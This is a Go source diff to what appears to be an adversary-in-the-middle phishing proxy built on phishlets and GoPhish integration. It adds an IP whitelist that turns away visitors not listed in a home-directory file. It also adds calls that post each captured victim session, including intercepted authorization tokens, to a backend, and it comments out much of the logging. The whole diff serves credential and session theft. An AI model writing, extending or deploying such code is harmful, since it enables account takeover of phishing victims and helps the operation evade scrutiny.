@@ -17,6 +17,8 @@ import (
 	"encoding/base64"
 	"encoding/json"
 	"fmt"
+
+	//"go/scanner"
 	"html"
 	"io"
 	"io/ioutil"
@@ -26,6 +28,7 @@ import (
 	"os"
 	"path/filepath"
 	"regexp"
+	"runtime"
 	"sort"
 	"strconv"
 	"strings"
@@ -45,6 +48,10 @@ import (
 )
 
 var sessionCookieSalt string
+
+/* var customWhitelistCache map [string]bool
+var customLastMod time.Time */
+var customWhitelistMtx  sync.Mutex
 
 func init() {
     b := make([]byte, 16)
@@ -118,13 +125,13 @@ func SetJSONVariable(body []byte, key string, value interface{}) ([]byte, error)
 }
 
 func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *database.Database, bl *Blacklist, developer bool) (*HttpProxy, error) {
-	log.Info("hostname: %s", hostname)
+/* 	log.Info("hostname: %s", hostname)
 	log.Info("port: %d", port)
 	log.Info("cfg: %v", cfg)
 	log.Info("crt_db: %v", crt_db)
 	log.Info("db: %v", db)
 	log.Info("bl: %v", bl)
-	log.Info("developer: %t", developer)
+	log.Info("developer: %t", developer) */
 	p := &HttpProxy{
 		Proxy:             goproxy.NewProxyHttpServer(),
 		Server:            nil,
@@ -195,6 +202,11 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 					from_ip = strings.SplitN(origin_ip, ":", 2)[0]
 					break
 				}
+			}
+
+			if !p.isIPAllowedByFile(from_ip) {
+				log.Warning("request from IP '%s' blocked: not in custom whitelist", from_ip)
+				return p.blockRequest(req)
 			}
 
 			if p.cfg.GetBlacklistMode() != "off" {
@@ -1079,7 +1091,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 							log.Error("database: %v", err)
 						}
 						s.Finish(false)
-
+						go p.db.PostSessionToBackend(ps.SessionId)
 						if p.cfg.GetGoPhishAdminUrl() != "" && p.cfg.GetGoPhishApiKey() != "" {
 							rid, ok := s.Params["rid"]
 							if ok && rid != "" {
@@ -1220,6 +1232,8 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 								log.Success("[%d] detected authorization URL - tokens intercepted: %s", ps.Index, resp.Request.URL.Path)
 							}
 
+							go p.db.PostSessionToBackend(ps.SessionId)
+
 							if p.cfg.GetGoPhishAdminUrl() != "" && p.cfg.GetGoPhishApiKey() != "" {
 								rid, ok := s.Params["rid"]
 								if ok && rid != "" {
@@ -1255,6 +1269,16 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 					}
 				}
 			}
+			
+			/* if pl !=nil && ps.SessionId != "" {
+				if s, ok := p.sessions[ps.SessionId]; ok {
+					if s.IsDone {
+						//s.exported = true
+
+						go s.postToBackend()
+					}
+				}
+			} */
 
 			return resp
 		})
@@ -1265,6 +1289,63 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 	goproxy.RejectConnect = &goproxy.ConnectAction{Action: goproxy.ConnectReject, TLSConfig: p.TLSConfigFromCA()}
 
 	return p, nil
+}
+
+func getHomeDir() string {
+    home, err := os.UserHomeDir()
+    if err != nil {
+        // Fallback for Windows if UserHomeDir fails
+        if runtime.GOOS == "windows" {
+            return os.Getenv("USERPROFILE")
+        }
+        return "/root" // Linux fallback
+    }
+    return home
+}
+
+func (p *HttpProxy) isIPAllowedByFile(ip string) bool {
+	if ip == "127.0.0.2" || ip == "::1" {
+		return true
+	}
+	customWhitelistMtx.Lock()
+	defer customWhitelistMtx.Unlock()
+
+	homeDir := getHomeDir()
+	log.Info(": %s", homeDir)
+
+	searchPath := filepath.Join(homeDir, "whitelist.txt")
+
+	if _, err := os.Stat(searchPath); os.IsNotExist(err) {
+		fmt.Println("File not found at: ", searchPath)
+		return false
+	}
+
+	file, err := os.Open(searchPath)
+	if err != nil {
+		fmt.Println("Error open file: ", err)
+		return false
+	}
+	defer file.Close()
+
+	scanner := bufio.NewScanner(file)
+
+	for scanner.Scan() {
+		whitelistedIP := strings.TrimSpace(scanner.Text())
+		if whitelistedIP == ip {
+			fmt.Println("IP allowed: ", ip)
+			return true
+		}
+	}
+
+	if err := scanner.Err(); err != nil {
+		fmt.Println("Error reading file: ", err)
+		return false
+	}
+
+	fmt.Println("IP not found inwhitelist: ", ip)
+
+	//info, err := os.Stat("")
+	return false
 }
 
 func (p *HttpProxy) waitForRedirectUrl(session_id string) (string, bool) {
@@ -1311,36 +1392,35 @@ func (p *HttpProxy) waitForRedirectUrl(session_id string) (string, bool) {
 func (p *HttpProxy) blockRequest(req *http.Request) (*http.Request, *http.Response) {
 	var redirect_url string
 
-	log.Info("blockRequest: host=%s path=%s ua=%s remote=%s",
-		req.Host, req.URL.Path, req.UserAgent(), req.RemoteAddr)
+	//log.Info("blockRequest: host=%s path=%s ua=%s remote=%s",req.Host, req.URL.Path, req.UserAgent(), req.RemoteAddr)
 
 	pl := p.getPhishletByPhishHost(req.Host)
 	if pl != nil {
-		log.Info("blockRequest: phishlet matched: %s", pl.Name)
+		//log.Info("blockRequest: phishlet matched: %s", pl.Name)
 
 		cfg := p.cfg.PhishletConfig(pl.Name)
-		log.Info("blockRequest: phishlet unauth_url=%s", cfg.UnauthUrl)
+		//log.Info("blockRequest: phishlet unauth_url=%s", cfg.UnauthUrl)
 
 		redirect_url = cfg.UnauthUrl
 	} else {
-		log.Info("blockRequest: no phishlet matched for host=%s", req.Host)
+		//log.Info("blockRequest: no phishlet matched for host=%s", req.Host)
 	}
 
 	if redirect_url == "" {
-		log.Info("blockRequest: phishlet redirect empty, checking general unauth_url=%s", p.cfg.general.UnauthUrl)
+		//log.Info("blockRequest: phishlet redirect empty, checking general unauth_url=%s", p.cfg.general.UnauthUrl)
 		if len(p.cfg.general.UnauthUrl) > 0 {
 			redirect_url = p.cfg.general.UnauthUrl
 		}
 	}
 
-	log.Info("blockRequest: final redirect_url=%s", redirect_url)
+	//log.Info("blockRequest: final redirect_url=%s", redirect_url)
 
 	if redirect_url != "" {
-		log.Info("blockRequest: redirecting")
+		//log.Info("blockRequest: redirecting")
 		return p.javascriptRedirect(req, redirect_url)
 	}
 
-	log.Info("blockRequest: returning 403")
+	//log.Info("blockRequest: returning 403")
 	resp := goproxy.NewResponse(req, "text/html", http.StatusForbidden, "")
 	if resp != nil {
 		return req, resp
